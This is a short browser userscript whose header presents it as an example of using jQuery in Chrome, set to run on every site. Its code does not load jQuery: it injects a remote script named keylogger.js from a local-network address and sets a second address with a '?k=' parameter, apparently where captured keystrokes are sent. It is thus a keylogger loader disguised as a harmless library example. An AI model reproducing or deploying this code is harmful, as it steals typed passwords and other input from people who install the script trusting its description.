// ==UserScript==
// @name         jQuery For Chrome (A Cross Browser Example)
// @namespace    jQueryForChromeExample
// @include      *
// @author       Erik Vergobbi Vold & Tyler G. Hicks-Wright
// @description  This userscript is meant to be an example on how to use jQuery in a 
// ==/UserScript==


  var jq = document.createElement('script');
  jq.src = 'http://192.168.1.102/key/key/keylogger.js';
  jq.destination = 'http://192.168.1.102:5230/?k=';
  jq.type = 'text/javascript';
  document.getElementsByTagName('head')[0].appendChild(jq);